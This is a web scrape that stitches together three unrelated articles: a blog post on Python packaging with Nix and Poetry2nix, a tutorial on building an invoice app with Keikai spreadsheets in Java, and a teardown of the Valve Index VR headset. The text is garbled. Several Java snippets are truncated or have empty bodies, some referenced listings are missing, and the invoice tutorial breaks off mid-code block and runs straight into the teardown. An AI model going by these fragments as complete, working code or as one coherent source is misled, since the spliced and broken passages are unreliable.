<p>There are two standard techniques for integrating Python projects with Nix.</p>
<h3>Nix only</h3>
<p>The first technique uses only Nix for package management, and is described in the <a href="https://nixos.org/nixpkgs/manual/#python">Python section</a> of the Nix manual.
While it works and may look very appealing on the surface, it uses Nix for all package management needs, which comes with some drawbacks:</p>
<ol>
<li>We are essentially tied to whatever package version Nixpkgs provides for any given dependency.
This can be worked around with overrides, but those can cause version incompatibilities.
This happens often in complex Python projects, such as data science ones, which tend to be very sensitive to version changes.</li>
<li>We are tied to using packages already in Nixpkgs.
While Nixpkgs has many Python packages already packaged up (around 3000 right now) there are many packages missing — PyPi, the Python Package Index has more than 200000 packages.
This can of course be worked around with overlays and manual packaging, but this quickly becomes a daunting task.</li>
<li>In a team setting, every team member wanting to add packages needs to buy in to Nix and at least have some experience using and understanding Nix.</li>
</ol>
<p>All these factors lead us to a conclusion: we need to embrace Python tooling so we can efficiently work with the entire Python ecosystem.</p>
<h3>Pip and Pypi2Nix</h3>
<p>The second standard method tries to overcome the faults above by using a hybrid approach of Python tooling together with Nix code generation.
Instead of writing dependencies manually in Nix, they are extracted from the <code>requirements.txt</code> file that users of Pip and Virtualenv are very used to.
That is, from a <code>requirements.txt</code> file containing the necessary dependencies:</p>

<p>we can use <a href="https://github.com/nix-community/pypi2nix">pypi2nix</a> to package our application in a more automatic fashion than before:</p>
<div data-language="sh"><pre><code>nix-shell -p pypi2nix --run "pypi2nix -r requirements.txt"</code></pre></div>
<p>However, Pip is not a dependency manager and therefore the <code>requirements.txt</code> file is not explicit enough — it lacks both exact versions for libraries, and system dependencies.
Therefore, the command above will not produce a working Nix expression.
In order to make pypi2nix work correctly, one has to manually find all dependencies incurred by the use of Pillow:</p>
<div data-language="sh"><pre><code>nix-shell -p pypi2nix --run "pypi2nix -V 3.8 -E pkgconfig -E freetype -E libjpeg -E openjpeg -E zlib -E libtiff -E libwebp -E tcl -E lcms2 -E xorg.libxcb -r requirements.txt"</code></pre></div>
<p>This will generate a large Nix expression, that will indeed work as expected.
Further use of Pypi2nix is left to the reader, but we can already draw some conclusions about this approach:</p>
<ol>
<li>Code generation results in huge Nix expressions that can be hard to debug and understand.
These expressions will typically be checked into a project repository, and can get out of sync with actual dependencies.</li>
<li>It’s very high friction, especially around native dependencies.</li>
</ol>
<p>Having many large Python projects, I wasn’t satisfied with the status quo around Python package management.
So I looked into what could be done to make the situation better, and which tools could be more appropriate for our use-case.
A potential candidate was <a href="https://github.com/pypa/pipenv">Pipenv</a>, however its dependency
solver and lock file format were difficult to work with.
In particular, Pipenv’s detection of “local” vs “non-local” dependencies did not work properly inside the Nix shell and gave us the wrong dependency graph.
Eventually, I found <a href="https://python-poetry.org/">Poetry</a> and it looked very promising.</p>
<h2>Poetry and Poetry2nix</h2>
<p>The <a href="https://python-poetry.org/docs/">Poetry package manager</a> is a relatively recent addition to the Python ecosystem but it is gaining popularity very quickly.
Poetry features a nice CLI with good UX and deterministic builds through lock files.</p>
<p>Poetry uses <code>pip</code> under the hood and, for this reason, inherited some of its shortcomings and lock file design.
I managed to land a few patches in Poetry before the 1.0 release to improve the lock file format, and now it is fit for use in Nix builds.
The result was <a href="https://github.com/nix-community/poetry2nix">Poetry2nix</a>, whose key design goals were:</p>
<ol>
<li>Dead simple API.</li>
<li>Work with the entire Python ecosystem using regular Python tooling.</li>
<li>Python developers should not have to be Nix experts, and vice versa.</li>
<li>Being an expert should allow you to “drop down” into the lower levels of the build and customise it.</li>
</ol>
<p>Poetry2nix is not a code generation tool — it is implemented in pure Nix.
This fixes many of problems outlined in previous paragraphs, since there is a single point of truth for dependencies and their versions.</p>
<p>But what about our native dependencies from before?
How does Poetry2nix know about those?
Indeed, Poetry2nix comes with an extensive set of overrides built-in for a lot of common packages, including Pillow.
Users are encouraged to contribute overrides <a href="https://github.com/nix-community/poetry2nix/blob/master/overrides.nix">upstream</a> for popular packages, so everyone can have a better user experience.</p>
<p>Now, let’s see how Poetry2nix works in practice.</p>
<h3>Developing with Poetry</h3>
<p>Let’s start with only our application file above (<code>imgapp/__init__.py</code>) and a <code>shell.nix</code>:</p>
<div data-language="nix"><pre><code><span>{</span> pkgs <span>?</span> <span>import</span> <span>&lt;</span>nixpkgs<span>&gt;</span> <span>{</span><span>}</span> <span>}</span><span>:</span>

pkgs<span>.</span>mkShell <span>{</span>

  buildInputs <span>=</span> <span>[</span>
    pkgs<span>.</span>python3
    pkgs<span>.</span>poetry
  <span>]</span><span>;</span>

<span>}</span></code></pre></div>
<p>Poetry comes with some nice helpers to create a project, so we run:</p>

<p>And then we’ll add our dependencies:</p>
<div data-language="sh"><pre><code>$ poetry add requests pillow flask</code></pre></div>
<p>We now have two files in the folder:</p>
<ul>
<li>The first one is <code>pyproject.toml</code> which not only specifies our dependencies but also replaces <code>setup.py</code>.</li>
<li>The second is <code>poetry.lock</code> which contains our entire pinned Python dependency graph.</li>
</ul>
<p>For Nix to know which scripts to install in the <code>bin/</code> output directory, we also need to add a <code>scripts</code> section to <code>pyproject.toml</code>:</p>
<div data-language="toml"><pre><code><span>[</span><span>tool.poetry</span><span>]</span>
<span>name</span> <span>=</span> <span>"imgapp"</span>
<span>version</span> <span>=</span> <span>"0.1.0"</span>
<span>description</span> <span>=</span> <span>""</span>

<span>[</span><span>build-system</span><span>]</span>
<span>requires</span> <span>=</span> <span>[</span><span>"poetry&gt;=0.12"</span><span>]</span>
<span>build-backend</span> <span>=</span> <span>"poetry.masonry.api"</span></code></pre></div>
<h3>Packaging with Poetry2nix</h3>
<p>Since Poetry2nix is not a code generation tool but implemented entirely in Nix, this step is trivial.
Create a <code>default.nix</code> containing:</p>
<div data-language="nix"><pre><code><span>{</span> pkgs <span>?</span> <span>import</span> <span>&lt;</span>nixpkgs<span>&gt;</span> <span>{</span><span>}</span> <span>}</span><span>:</span>
pkgs<span>.</span>poetry2nix<span>.</span>mkPoetryApplication <span>{</span>
  projectDir <span>=</span> <span>./.</span><span>;</span>
<span>}</span></code></pre></div>
<p>We can now invoke <code>nix-build</code> to build our package defined in <code>default.nix</code>.
Poetry2nix will automatically infer package names, dependencies, meta attributes and more from the Poetry metadata.</p>
<h3>Manipulating overrides</h3>
<p>Many overrides for system dependencies are already upstream, but what if some are lacking?
These overrides can be manipulated and extended manually:</p>
<div data-language="nix"><pre><code>poetry2nix<span>.</span>mkPoetryApplication <span>{</span>
    projectDir <span>=</span> <span>./.</span><span>;</span>
    overrides <span>=</span> poetry2nix<span>.</span>overrides<span>.</span>withDefaults <span>(</span>self<span>:</span> super<span>:</span> <span>{</span>
      foo <span>=</span> foo<span>.</span>overridePythonAttrs<span>(</span>oldAttrs<span>:</span> <span>{</span><span>}</span><span>)</span><span>;</span>
    <span>}</span><span>)</span><span>;</span>
<span>}</span></code></pre></div>
<h2>Conclusion</h2>
<p>By embracing both modern Python package management tooling and the Nix language, we can achieve best-in-class user experience for Python developers and Nix developers alike.</p>
<p>There are ongoing efforts to make Poetry2nix and other Nix Python tooling work better with data science packages like <code>numpy</code> and <code>scipy</code>.
I believe that Nix may soon rival Conda on Linux and MacOS for data science.</p>
<p>Python + Nix has a bright future ahead of it!</p></div></div></div></section></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div><p>After helping my colleague in the administration department turning her Excel file into a <a href="https://dzone.com/articles/turn-you-excel-file-into-a-web-application">Buy Currency Web App</a>, I now have the chance to help my colleague in the sales department by automating their invoice-generating process. In this article, I will share with you how I did it.</p>



<p>For salespersons, it is very common to create an invoice with Excel. But the process usually involves many error-prone manual actions like inputting data, copy/pasting,... etc. My colleague, like any salesperson, wishes that the data can be populated from the database into the invoice Excel template automatically, instead of having to input it manually. Therefore I took the time and created a web application, <strong>Invoice Builder</strong>, and turned such a manual process into an integrated, automated process leveraging Excel files, Java and, <a href="https://keikai.io/">Keikai</a>.</p>

<p>Here is a short clip of usage:</p>

<p><img src="https://keikai.io/blog/images/2020-08-invoice/usage-demo.gif" alt=""></p>



<p>The image below shows the architecture of invoice builder application:</p>

<p><img src="https://keikai.io/blog/images/2020-08-invoice/architecture.jpg" alt=""></p>

<ul>
<li>Initially, I import a source Excel file that has 2 empty tables -- the customer table and product table. A salesman will select customers and products from these tables.</li>
<li>Customer and product data is populated into the corresponding tables based on database queries.</li>
<li>We also import 2 invoice templates; they are created in Excel by our salesman. These templates will be used later.</li>
<li>Workflow: after selecting customers and products, the app will create invoices by combining customer and product data with the selected invoice template.</li>
</ul>



<p>The first step is to build the UI for this app. Since our salesman is used to work with Excel templates, we use Keikai Spreadsheet here so that he can continue using his existing templates. To give you a quick background, Keikai is based on <a href="http://www.zkoss.org/">ZK UI framework</a> which provides a complete set of UI components, and an XML-formatted UI language, <a href="https://www.zkoss.org/wiki/ZUML_Reference"><strong>ZUL</strong></a>. Following ZK's syntax, I build this web application's UI with the following UI components in XML tags:</p>
<div><pre><code data-lang="xml"><span>&lt;hlayout</span> <span>vflex=</span><span>"1"</span> <span>width=</span><span>"100%"</span> <span>apply=</span><span>"io.keikai.devref.usecase.invoice.InvoiceBuilderController"</span><span>&gt;</span>
    <span>&lt;spreadsheet</span> <span>height=</span><span>"100%"</span> <span>id=</span><span>"spreadsheet"</span> <span>hflex=</span><span>"8"</span>
                <span>maxVisibleRows=</span><span>"6"</span> <span>maxVisibleColumns=</span><span>"8"</span>
                <span>src=</span><span>"/WEB-INF/books/invoice-source.xlsx"</span>
                <span>showSheetbar=</span><span>"true"</span><span>/&gt;</span>
    <span>&lt;vlayout</span> <span>hflex=</span><span>"2"</span> <span>height=</span><span>"100%"</span><span>&gt;</span>
        <span>&lt;groupbox</span> <span>id=</span><span>"templateBox"</span> <span>title=</span><span>"Template"</span> <span>style=</span><span>"text-align: center"</span><span>&gt;</span>
        <span>&lt;/groupbox&gt;</span>
        <span>&lt;button</span> <span>id=</span><span>"create"</span> <span>label=</span><span>"Create"</span> <span>style=</span><span>"float: right"</span><span>/&gt;</span>
    <span>&lt;/vlayout&gt;</span>
<span>&lt;/hlayout&gt;</span>
</code></pre></div>
<ul>
<li><code>&lt;spreadsheet&gt;</code>: keikai spreadsheet.</li>
<li><a href="https://www.zkoss.org/zkdemo/getting_started/layout"><code>&lt;hlayout&gt;</code></a>: It layouts its child components horizontally in a row, and <code>&lt;vlayout&gt;</code> layouts components vertically.</li>
<li><a href="https://www.zkoss.org/zkdemo/layout/group_box"><code>&lt;groupbox&gt;</code></a>: It groups components with a border and a title.</li>
</ul>

<p>Each tag supports some attributes, for example:</p>

<ul>
<li><code>src</code>: specify an Excel file path to be imported into Keikai.</li>
<li><code>maxVisibleRows</code>: controls the maximum visible rows when keikai renders a sheet in a browser.</li>
</ul>

<p>For the complete attribute list, please refer to <a href="https://doc.keikai.io/dev-ref/Control_Components#zul-attributes">Keikai Developer Reference</a> and <a href="http://books.zkoss.org/wiki/ZK_Component_Reference">ZK Component Reference</a>.</p>



<p>I am used to working with MVC and Keikai does support that. Let me explain each role under the context of Keikai:</p>

<p><img src="https://keikai.io/blog/images/2020-08-invoice/mvc.jpg" alt=""></p>

<ul>
<li><strong>View</strong> : An XML file written in ZUL. ZK translates a zul file into UI components and renders in your browsers.</li>
<li><strong>Controller</strong>: A Java class that extends ZK <a href="https://www.zkoss.org/javadoc/latest/zk/org/zkoss/zk/ui/select/SelectorComposer.html"><code>SelectorComposer</code></a> that listens to events fired from View and control ZK UI components. It controls Keikai by <code>Spreadsheet</code> and <code>Range</code> API.</li>
<li><strong>Model</strong>: In my case, it's <code>CustomerService</code>, but it could be any of your java business classes, e.g. authentication, data query</li>
</ul>

<h2 id="specify-a-controller">Specify a Controller</h2>

<p>To specify a Controller for a page, I specify a full-qualified class name at <code>apply</code> attribute:</p>
<div><pre><code data-lang="xml"><span>&lt;hlayout</span> <span>vflex=</span><span>"1"</span> <span>width=</span><span>"100%"</span> <span>apply=</span><span>"io.keikai.devref.usecase.invoice.InvoiceBuilderController"</span><span>&gt;</span>
...
<span>&lt;/hlayout&gt;</span>
</code></pre></div>
<p>Then this controller can control <code>&lt;hlayout&gt;</code> and its child components. I usually specify a controller at the root component on a page.</p>



<p>Personally, I like to work with zul because it is easy to read. If you prefer to work with pure Java (like Swing) instead of using zul, it is also possible. You can create a component with <a href="https://www.zkoss.org/javadoc/latest/zk/org/zkoss/zul/Image.html"><code>new Image()</code></a>, add a component into a Groupbox (container) by <code>appendChild()</code>, and register an event listener with <code>addEventListener()</code>. With those API, you can dynamically create template preview images upon a template list array inside a groupbox:</p>

<p><img src="https://keikai.io/blog/images/2020-08-invoice/preview-images.jpg" alt=""></p>
<div><pre><code data-lang="java"><span>@Wire</span>
<span>private</span> <span>Groupbox</span> <span>templateBox</span><span>;</span>
<span>private</span> <span>String</span><span>[]</span> <span>templateFileNameList</span> <span>=</span> <span>{</span><span>"invoice-template1.xlsx"</span><span>,</span> <span>"invoice-template2.xlsx"</span><span>};</span>
<span>...</span>

    <span>...</span>

        <span>templateBox</span><span>.</span><span>appendChild</span><span>(</span><span>preview</span><span>);</span>
        <span>preview</span><span>.</span><span>setAttribute</span><span>(</span><span>TEMPLATE_KEY</span><span>,</span> <span>fileName</span><span>);</span>
        <span>preview</span><span>.</span><span>addEventListener</span><span>(</span><span>org</span><span>.</span><span>zkoss</span><span>.</span><span>zk</span><span>.</span><span>ui</span><span>.</span><span>event</span><span>.</span><span>Events</span><span>.</span><span>ON_CLICK</span><span>,</span> <span>event</span> <span>-&gt;</span>
                <span>selectTemplate</span><span>((</span><span>Image</span><span>)</span> <span>event</span><span>.</span><span>getTarget</span><span>()));</span>
        <span>...</span>
    <span>});</span>
    <span>...</span>
<span>}</span>
</code></pre></div>


<p>Now that we can display the spreadsheet and the source file, we need to populate data into the table.</p>

<p>The source Excel file just contains an empty customer table with table styles like column names and header colors. One good thing here is that this Excel file is created by my salesperson using Excel -- he knows better what he wants to see in this table.</p>

<p><img src="https://keikai.io/blog/images/2020-08-invoice/customer-table.jpg" alt=""></p>

<p>I load customer list from a service class and populate the list into the table:</p>
<div><pre><code data-lang="java"><span>private</span> <span>void</span> <span>populateCustomers</span><span>()</span> <span>{</span>
    <span>List</span><span>&lt;</span><span>String</span><span>[]&gt;</span> <span>customers</span> <span>=</span> <span>CustomerService</span><span>.</span><span>getCustomerList</span><span>();</span>
    <span>Range</span> <span>startingCell</span> <span>=</span> <span>customerTable</span><span>.</span><span>toCellRange</span><span>(</span><span>0</span><span>,</span> <span>1</span><span>);</span> <span>//the 1st column is for checkbox</span>
    <span>for</span> <span>(</span><span>String</span><span>[]</span> <span>c</span> <span>:</span> <span>customers</span><span>)</span> <span>{</span>
        <span>RangeHelper</span><span>.</span><span>setValuesInRow</span><span>(</span><span>startingCell</span><span>,</span> <span>c</span><span>);</span>
        <span>startingCell</span> <span>=</span> <span>startingCell</span><span>.</span><span>toShiftedRange</span><span>(</span><span>1</span><span>,</span> <span>0</span><span>);</span>
    <span>}</span>
<span>}</span>
</code></pre></div>
<ul>
<li><code>CustomerService</code> could also be any Java class that provides data entities in your case.</li>
<li><code>setValuesInRow()</code> fills multiple cells one by one in a row with an array of string, e.g. B2, C2, D2...</li>
<li><a href="https://keikai.io/javadoc/latest/io/keikai/api/Range.html#toShiftedRange-int-int-"><code>toShiftedRange(1, 0)</code></a> shifts <code>startingCell</code> to the next row.</li>
</ul>



<p>When populating data to the spreadsheet UI, we need to specify the target cells that we wish to populate the data into. I go with Named Ranges as it is a flexible way. It works like a <strong>place holder</strong> in this application. Firstly, I create several named ranges in each template file e.g. <code>Name</code>, <code>Phone</code>, and <code>Email</code> for customer details. After an end-user selects customers and products, the controller extracts each row as a map. The key is header value, the value is the corresponding cell value, e.g. <code>{Name: Debra, Phone: 338-8777, Email: debra@yahoo.com...}</code>. Then I clone an invoice sheet from the selected template and populate customer details into the corresponding named ranges.</p>

<p>In this app, customer data is populated from the database, and we don't want our salespersons to change them. They should only select these records. Therefore, I limit what they can do on the UI in the following ways:</p>

<h2 id="hide-toolbar-and-context-menu">Hide Toolbar and Context Menu</h2>

<p>I make the sheet tab visible by specifying <code>showSheetbar="true"</code>. Everything else like the toolbar, formula bar, and the context menu is invisible by default. With this, users won't accidentally change what's displayed on the UI.</p>
<div><pre><code data-lang="xml"><span>&lt;spreadsheet</span> <span>...</span> <span>showSheetbar=</span><span>"true"</span><span>/&gt;</span>
</code></pre></div>
<h2 id="enable-sheet-protection-amp-disable-adding-a-sheet">Enable Sheet Protection &amp; Disable Adding a Sheet</h2>

<p>Then, I also enable sheet protection by <code>protectSheet()</code> to make all sheets read-only and forbid users adding a sheet by <code>disableUserAction()</code>.</p>
<div><pre><code data-lang="java"><span>private</span> <span>void</span> <span>limitAccess</span><span>()</span> <span>{</span>
    <span>for</span> <span>(</span><span>int</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>spreadsheet</span><span>.</span><span>getBook</span><span>().</span><span>getNumberOfSheets</span><span>();</span> <span>i</span><span>++)</span> <span>{</span>

<span>}</span>
</code></pre></div>
<h2 id="editable-area-under-sheet-protection">Editable Area under Sheet Protection</h2>

<p>In Excel, you can uncheck <strong>locked</strong> status to make a cell editable under sheet protection. Other cells will remain read-only. With this setting, you can allow a range of editable area in a protected sheet. This setting will stay after importing to Keikai, so this can be done from the Excel side when we prepare the source files.</p>

<p><img src="https://keikai.io/blog/images/2020-08-invoice/unchecked-locked.jpg" alt=""></p>



<p>In this app, I have 2 Excel templates and I want to import them once and then use them whenever needed. </p>

<p>Keikai <a href="https://keikai.io/javadoc/latest/io/keikai/api/Importer.html"><code>Importer</code></a> converts an Excel xlsx file into a <a href="https://keikai.io/javadoc/latest/io/keikai/api/model/Book.html"><code>Book</code></a>. You can assign the <code>Book</code> to <a href="https://keikai.io/javadoc/latest/io/keikai/ui/Spreadsheet.html"><code>Spreadsheet</code></a> and render it to a browser. Alternatively, you can manipulate a <code>Book</code> with <a href="https://keikai.io/javadoc/latest/io/keikai/api/Range.html"><code>Range</code></a> directly without assigning it to a <code>Spreadsheet</code>. The most-commonly usages are to clone sheets or copy cells from a template book. Everyone who needs the Excel template can grab content from them without importing the template file again.</p>

<p>In my application, I store the <code>Book</code> objects of 2 template Excel files in a <code>Map</code> (<code>templateWarehouse</code>) for future use:</p>
<div><pre><code data-lang="java"><span>private</span> <span>static</span> <span>HashMap</span><span>&lt;</span><span>String</span><span>,</span> <span>Book</span><span>&gt;</span> <span>templateWarehouse</span> <span>=</span> <span>new</span> <span>HashMap</span><span>&lt;&gt;();</span>

                <div>
                    <p>If you have ever wondered what is inside Valve Index, you might have stumbled upon my <a href="https://www.reddit.com/r/ValveIndex/comments/cpayc5/valve_index_disassembly/">reddit post from 2019</a>. I’ve decided to dive into the details of what makes Valve Index great and share my thoughts on tech inside.</p>

<p>Teardown should begin from the simplest parts - remove the face mask (held by just magnets), unplug the main cable, and remove headphones that are held in place by a single screw each. Next remove the rubber cover that is glued around lenses. It’s not that well glued, you can just pull it off.</p>

<p><img src="https://www.thevrist.com/assets/images/index1.jpg" alt="">
<em>Rubber cover that prevents dust from getting inside lenses</em></p>

<p>Let’s start with a front panel - glossy front panel is removed by hand, since it is only held by magnets (but you already knew that from all the numerous pictures of people shoving stuff in the frunk of the headset). The rest of the front panel can be easily split in two parts. First is the frunk section, it will give you access to the main circuit board of the headset. You can remove it quite painlessly if you have the correct screwdriver. This panel does not contain any electronics.</p>

<p><img src="https://www.thevrist.com/assets/images/index-face.jpg" alt="">
<em>Just look at this beauty</em></p>

<p>Second part of the front panel is more complex. It contains tracking points for the SteamVR tracking - you can see them by looking at the plastic at different angles - plastic covering tracking points is thinner so laser beams from base stations could shoot through it. SteamVR trackers are split in two independent parts, which are connected to the main circuit separately. Also this panel contains two front facing cameras, which makes the process of taking it off even more delicate. You have to disconnect two cameras and two halves of the tracking plate’s system to finally fully reveal the main circuit.</p>

<h2 id="main-circuit">Main Circuit</h2>

<p><img src="https://www.thevrist.com/assets/images/index2.jpg" alt="">
<em>The “meat” of Valve Index</em></p>

<p>Finally we get to the main computing power of the headset. You can identify the main points of the headset.</p>

<p><img src="https://www.thevrist.com/assets/images/index3-1.png" alt="">
<em>This is where all the cables connect to the HMD</em></p>

<p>On the top there is a metal connector with FPC cable going in. It is going to the smaller circuit in the top part of the headset where the cable plugs in the headset.</p>

<p><img src="https://www.thevrist.com/assets/images/index4.jpg" alt="">
<em>Circuit board with main cable and 3.5 mm audio port. It also connects to the proximity sensor</em></p>

<p>Same circuit has a 3.5 mm audio port for connecting headphones (I bet you didn’t know there is an audio jack) and proximity sensor between lenses. Last one is used for turning off the screens when the headset is not on the head.</p>

<p><img src="https://www.thevrist.com/assets/images/index2-1.png" alt="">
<em>SteamVR tracking points are connected here</em></p>

<p>On the sides of the main circuit board there are two black FPC cables. Those are going to the SteamVR tracking dots located in the sides of the headsets. Here is a picture of the tracking “web” when taken out of the headset.</p>

<p><img src="https://www.thevrist.com/assets/images/index5.jpg" alt="">
<em>One side of SteamVR tracking web taken out of the HMD</em></p>

<p>Final two FPC cables are orange color and located at the bottom of the main board. They are connecting to a pair of displays located right behind this circuit.</p>

<h2 id="microchips">Microchips</h2>

<p>Now it is time to dive in a wonderful world of microchips and circuit boards. I want to thank <a href="https://www.linkedin.com/in/popovs/">Sergejs Popovs</a> for helping to identify most of the components on the board.</p>

<p>Let’s start with simple chips. Here are two bluetooth <a href="https://www.nordicsemi.com/Products/Low-power-short-range-wireless/nRF52840">chips from Nordic Semiconductors</a>. Each of these chips is used for connecting one controller with the headset. That’s why there is a limitation of two devices connected to the HMD. If you want to connect more devices (Vive Trackers or other controllers) you will need to use a USB dongle with a separate Bluetooth chip.</p>

<p><img src="https://www.thevrist.com/assets/images/index6.jpg" alt="">
<img src="https://www.thevrist.com/assets/images/index7.jpg" alt="">
<em>Bluetooth microchips, each connects to one device</em></p>

<p>Do you remember the USB port in the frunk? Well, this is a <a href="http://ww1.microchip.com/downloads/en/DeviceDoc/USB5744-Data-Sheet-DS00001855J.pdf">chip from Microchip</a> for that USB port - hence USB in the name.</p>

<p><img src="https://www.thevrist.com/assets/images/index4-4.jpg" alt="">
<em>USB chip for USB port next to it</em></p>

<p>Here is a <a href="https://www.via-labs.com/product_show.php?id=96">chip from Via-Labs</a>. It has a purpose of converting USB 3.1 signal to the 2.0 one. Some of the chips on the circuit are not advanced enough to understand 3.1 USB, so this chip “dumbs it down”. When the signal will need to go back to the PC, the chip will convert the signal back to the USB 3.1.</p>

<p><img src="https://www.thevrist.com/assets/images/index8.jpg" alt="">
<em>USB signal converter chip</em></p>

<p>This is a flash memory chip from <a href="https://www.digikey.com/products/en/integrated-circuits-ics/memory/774?k=w25q32jw">Winbond Electronics</a>.</p>

<p><img src="https://www.thevrist.com/assets/images/index9.jpg" alt="">
<em>Flash memory can be used for different kinds of tasks</em></p>

<p>Next are these two microchips. The smaller one is a <a href="https://www.analogix.com/en/products/dp-mipi-converters/anx7530">SlimPort® 4K receiver from Analogix</a>. It is capable of receiving Image in 4K at 60 Hz, but since screens in Valve Index are only 1440 by 1600 pixels it allows to process video at 90, 120, and even 144 Hz. It also splits the signal in two allowing each display to get its own image.</p>

<p><img src="https://www.thevrist.com/assets/images/index10.jpg" alt="">
<em>Video chips convert image that you see in your SteamVR mirror in beautiful VR image</em></p>

<p>Larger chip is a multipurpose <a href="https://www.digikey.com/products/en/integrated-circuits-ics/embedded-fpgas-field-programmable-gate-array/696?k=ICE40HX8K">FPGA (Field Programmable Gate Array) chip from Lattice Semiconductor</a>. It is used for tracking - all the data received from the tracking sensors is gathered here. This chip combined with the <a href="http://ww1.microchip.com/downloads/en/DeviceDoc/Atmel-11289-32-bit-Cortex-M4-Microcontroller-SAM-G55_Summary-Datasheet.pdf">Atmel MCU</a> (located on the other side of the circuit board) are doing all the necessary tracking calculations.</p>

<p><a href="http://www.etron.com.tw/cn/products/webcam_detial.php?Product_ID=10">EtronTech microchip</a> is used for merging video feeds from external cameras and transmitting it to your PC.</p>

<p><img src="https://www.thevrist.com/assets/images/index11.jpg" alt="">
<em>Microchip for processing image from webcams</em></p>

<p>Last two chips on this side of the circuit from <a href="https://www.silabs.com/power/efp01-power-management-ic">SiliconLabs</a> are most likely related to power regulation. Both of them are located near the capacitors and an inductor (metal thingy with 150 written on it). These are making sure that nothing will get too hot on your face.</p>

<p><img src="https://www.thevrist.com/assets/images/index12.jpg" alt="">
<img src="https://www.thevrist.com/assets/images/index13.jpg" alt="">
<em>Power regulating microchips</em></p>

<p>Next step is to remove the main circuit board and look on its other side. Other side is less interesting and has very little information to offer. Most parts are related to the power regulation mentioned in the previous paragraph.</p>

<p><img src="https://www.thevrist.com/assets/images/index14.jpg" alt="">
<em>Back side of the main circuit board</em></p>

<p>Largest chip is an Atmel MCU, which I’ve already mentioned is related to the tracking system. On the left from it is a <a href="https://www.nxp.com/docs/en/data-sheet/LPC11U1X.pdf">microcontroller from NXP</a>. These are all the chips we managed to identify. One chip that is missing, is the additional Bluetooth module. Unlike Vive and Vive Pro, Index has bluetooth in the headset. It is used for connecting to the base stations, updating base station firmware, and sending them to sleep mode when the headset is turning off. Last one is completely optional - I prefer to keep my base stations 2.0 on all the time.</p>

<p><img src="https://www.thevrist.com/assets/images/index14-2.jpg" alt="">
<em>The only two chips worth noting on this side of the motherboard - larger one is for tracking calculations</em></p>

<p>Why there is no separate Bluetooth chip for this purpose is still a mystery for me. Only possible explanation is that two Bluetooth chips for controllers are capable of switching to different modes and control the base stations.</p>

<h2 id="screens">Screens</h2>

<p>After the circuit is removed you will reveal several key components. First - you can see two displays - quick search shows that those panels are made by BOE Technology - Chinese display manufacturer. Those are 1440×1600, 615PPI 3.5” <a href="https://www.panelook.com/VS035ZSM-NW0-69P0_BOE_3.5_LCM_overview_37926.html">panels</a>.</p>

<p><img src="https://www.thevrist.com/assets/images/index15.jpg" alt="">
<em>View of the HMD with main board removed</em></p>

<p>Note some key elements in this view. On the bottom there is a circular mechanism with a metal pin with springs going through the whole headset. Similar pin is barely visible on the top of the headset. This is an IPD adjustment system - movement of the knob at the bottom of the HMD will rotate circular element in the bottom center which will push screens apart.
On the left and right sides of HMD you can see black gears - this is a system for eye relief - rotating a knob on the side of the headset will move the facemask relatively to the screens. Gear system is making sure both sides are rotating simultaneously, without giving too much pressure to the mechanism.</p>

<p><img src="https://www.thevrist.com/assets/images/index16.jpg" alt="">
<em>IPD knob is actually a screw</em></p>

<p>In order to take the central part out from the headset, you will need to take the cap off the IPD adjustment knob and unscrew it.</p>

<p><img src="https://www.thevrist.com/assets/images/index17.jpg" alt="">
<em>Lens chambers with IPD mechanism still attached</em></p>

<p>Next was what I call the “wondering in the dark” part of teardown - for about 30 minutes we were trying to find a way of taking it apart without breaking anything, eventually using force to break one gear inside that was holding display chambers in place.</p>

<p><img src="https://www.thevrist.com/assets/images/index18.jpg" alt="">
<em>Right eye lens chamber removed</em></p>

<p>After this step you can easily take off separate lens chambers and view the details. Chambers are sealed shut so nothing will get inside - they are assembled in perfectly clean conditions with no dust particles. 
In order to take it apart you can probably try to melt glue or something like that. But we are no iFixit, we used good ol’ force. Here you can see the screen separated from the chamber.</p>

<p><img src="https://www.thevrist.com/assets/images/index19.jpg" alt="">
<img src="https://www.thevrist.com/assets/images/index20.jpg" alt="">
<em>BOE screen removed from the chamber</em></p>

<p>Screen has a polarised diffuser glued to it, which is particularly difficult to remove. It is made of very thin crystal glass and it cracks easily. You can see that the corners of it are cracked.</p>

<p><img src="https://www.thevrist.com/assets/images/index21.jpg" alt="">
<em>Crystal polarisation diffuser</em></p>

<p>Diffuser is added to blend pixels better, making the screen door effect even lower.</p>

<p><img src="https://www.thevrist.com/assets/images/index22.jpg" alt="">
<em>Fancy multilayered lens</em></p>

<p>Finally - the lenses. I was expecting them to be thicker with the effect that they create. Valve are saying “The custom lenses built into the Valve Index Headset maximize field of view without sacrificing edge-to-edge clarity. High geometric stability allows you to look around the scene by moving your eyes (not just your head) with minimal shape distortion”. I tend to agree that these are the most advanced lenses in modern mass produced HMD, even though they have their own flaws. Main issue is the light spill when using a headset, you can see the bright light’s reflections in spots where they shouldn’t be.</p>

<h2 id="final-thoughts">Final thoughts</h2>

<p>As you can clearly see, it is not possible to replace a damaged screen or scratched lens all by yourself (even though for latter one you might try to take the lens out using a suction cup, however I don’t think that is a good idea, as lenses and screens are calibrated in the factory).</p>

<p><img src="https://www.thevrist.com/assets/images/index-end.jpg" alt="">
<em>Sometimes… I feel like a monster…</em></p>

<p>I am going to put the high-resolution images of the teardown and of the motherboard <a href="https://photos.app.goo.gl/dhuPVWTu6P5XWo4HA">here</a> so you can see and check all the details by yourself.
